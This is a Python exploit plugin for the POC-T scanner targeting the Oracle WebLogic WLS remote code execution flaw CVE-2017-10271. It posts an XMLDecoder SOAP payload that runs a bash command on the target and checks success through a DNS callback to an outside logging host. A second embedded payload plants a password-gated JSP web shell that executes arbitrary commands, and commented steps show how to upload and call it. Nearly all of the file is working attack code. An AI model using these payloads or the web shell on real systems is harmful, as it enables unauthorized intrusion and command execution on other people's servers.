#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = starnight_cyber

"""
    Script : weblogic-wls.py
    Author : starnight_cyber
    Time : 2017.1.8

    WebLogic Server WLS RCE (CVE-2017-10271):
        OracleWebLogic Server 10.3.6.0.0
        OracleWebLogic Server 12.1.3.0.0
        OracleWebLogic Server 12.2.1.1.0
        OracleWebLogic Server 12.2.1.2.0

"""

import requests
import re
from plugin.cloudeye import CloudEye


headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
    "Accept-Charset": "GBK,utf-8;q=0.7,*;q=0.3",
    "Content-Type": "text/xml"
}

payload2 = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext
    xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java version="1.4.0" class="java.beans.XMLDecoder">
    <void class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/zero.jsp</string>
    <void method="println"><string><![CDATA[<%   if("v".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    } %>]]></string></void><void method="close"/>
    </void></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>
'''



def poc(url):
    try:
        # # Step 1: POST webshell to target, if remote system is vulnerable, it will create a zero.jsp on remote machine
        # url1 = 'http://' + url + '/wls-wsat/CoordinatorPortType'
        # # print url1
        # resp = requests.post(url1, data=payload, headers=headers, timeout=5)  # attack

        # # Step 2 : Check whether can execute command on target
        # url2 = 'http://' + url + '/bea_wls_internal/zero.jsp?pwd=v&i=whoami'
        # print url2
        # # print url2, check this url by your hand
        # resp = requests.get(url2, timeout=5)
        # if 'pre' in resp.content:
        # # print resp.content
        # # check whether succeed or not
        #     return resp.status_code
        target = 'http://' + url + ':7001/wls-wsat/CoordinatorPortType'
        cloudeye = CloudEye()
        domain = cloudeye.getRandomDomain('weblogic')
        rce_command = 'ping -c 3 %s' % (domain)
        payload = '''
            <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java version="1.4.0" class="java.beans.XMLDecoder">
            <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
            <void index="0">
            <string>/bin/bash</string>
            </void>
            <void index="1">
            <string>-c</string>
            </void>
            <void index="2">
            <string>%s</string>
            </void>
            </array>
            <void method="start"/></void>
            </java>
            </work:WorkContext>
            </soapenv:Header>
            <soapenv:Body/>
            </soapenv:Envelope>
        ''' % (rce_command)
        resp = requests.post(target, data=payload, headers=headers, timeout=5)
        dnslog = cloudeye.getDnsRecord(delay=2)
        if domain in dnslog:
            msg = url
            for remote_addr in re.findall(r'\d+\.\d+\.\d+\.\d+', dnslog):  # 获取出口ip
                msg += ' - ' + remote_addr
            return msg

    except Exception,e:
        # anything wrong, return False
        # print e
        return False
